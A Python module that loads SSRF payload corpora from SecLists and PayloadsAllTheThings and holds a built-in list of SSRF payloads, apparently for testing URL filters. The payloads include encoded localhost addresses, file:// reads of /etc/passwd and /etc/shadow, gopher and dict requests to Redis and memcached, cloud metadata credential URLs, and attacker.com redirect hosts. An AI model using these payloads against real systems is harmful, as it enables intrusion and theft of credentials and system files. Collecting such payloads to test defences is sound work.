"""Load and normalize raw SSRF payload corpora."""
from __future__ import annotations

from pathlib import Path


def normalize_payload(line: str) -> str:
    """Strip whitespace, drop blank lines and pure comments."""
    s = line.strip()
    if not s:
        return ""
    if s.startswith("#"):
        return ""
    return s


def load_payloads_from_file(path: Path) -> list[str]:
    out: list[str] = []
    for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        p = normalize_payload(line)
        if p:
            out.append(p)
    return out


def load_payloads_from_dir(root: Path) -> list[str]:
    """Recursively load all .txt payloads under root, deduped, order preserved."""
    root = Path(root)
    seen: set[str] = set()
    out: list[str] = []
    files = sorted(root.rglob("*.txt")) if root.is_dir() else []
    for f in files:
        for p in load_payloads_from_file(f):
            if p not in seen:
                seen.add(p)
                out.append(p)
    return out


# Built-in SSRF payloads for when no external corpus is available.
BUILTIN_PAYLOADS: list[str] = [
    # Localhost direct
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    # Decimal IP encoding
    "http://2130706433/",
    "http://0x7f000001/",
    "http://017700000001/",
    # IPv6
    "http://[::1]/",
    "http://[::ffff:127.0.0.1]/",
    "http://[::ffff:7f00:1]/",
    # Short forms
    "http://127.1/",
    "http://127.0.1/",
    "http://0/",
    # Other private ranges
    "http://10.0.0.1/",
    "http://192.168.1.1/",
    "http://172.16.0.1/",
    # Scheme abuse
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "file:///etc/shadow",
    "gopher://127.0.0.1:6379/_INFO",
    "gopher://127.0.0.1:25/_HELO",
    "dict://127.0.0.1:11211/stats",
    "dict://127.0.0.1:11211/get%20foo",
    "ftp://127.0.0.1/",
    "ldap://127.0.0.1/",
    "tftp://127.0.0.1/etc/passwd",
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    # URL parser confusion
    "http://evil@127.0.0.1/",
    "http://evil.com@127.0.0.1/",
    "http://127.0.0.1\t/",
    "http://127.0.0.1%00/",
    "http://127.0.0.1%23/",
    "http://127.0.0.1/%09",
    "http://127.0.0.1:80@127.0.0.1/",
    # Redirect bypass
    "http://attacker.com/redirect",
    "http://attacker.com/302-to-internal",
    # Internal services
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:3000/",
    "http://127.0.0.1:4444/",
    "http://127.0.0.1:5000/",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:8000/",
    "http://127.0.0.1:8081/",
    "http://127.0.0.1:8443/",
    "http://127.0.0.1:8888/",
    "http://127.0.0.1:9090/",
    "http://127.0.0.1:9200/",
    "http://127.0.0.1:11211/",
    "http://127.0.0.1:27017/",
    "http://127.0.0.1:5432/",
    "http://127.0.0.1:3306/",
    "http://10.0.0.1:8080/",
    "http://192.168.1.1:8080/",
    # Public targets (should always pass filters)
    "http://example.com/",
    "http://8.8.8.8/",
    "http://1.1.1.1/",
    "https://example.com/",
    "https://8.8.8.8/",
    "https://1.1.1.1/",
    "http://example.com/path",
    "http://example.com:80/",
    "http://example.com:443/",
]


def load_all_corpora(raw_dir: Path) -> list[str]:
    """Load external corpora if available, plus built-in payloads, deduped."""
    raw_dir = Path(raw_dir)
    seen: set[str] = set()
    out: list[str] = []

    for subdir in ("SecLists", "PayloadsAllTheThings"):
        d = raw_dir / subdir
        if d.is_dir():
            for payload in load_payloads_from_dir(d):
                if payload not in seen:
                    seen.add(payload)
                    out.append(payload)

    for payload in BUILTIN_PAYLOADS:
        if payload not in seen:
            seen.add(payload)
            out.append(payload)

    return out
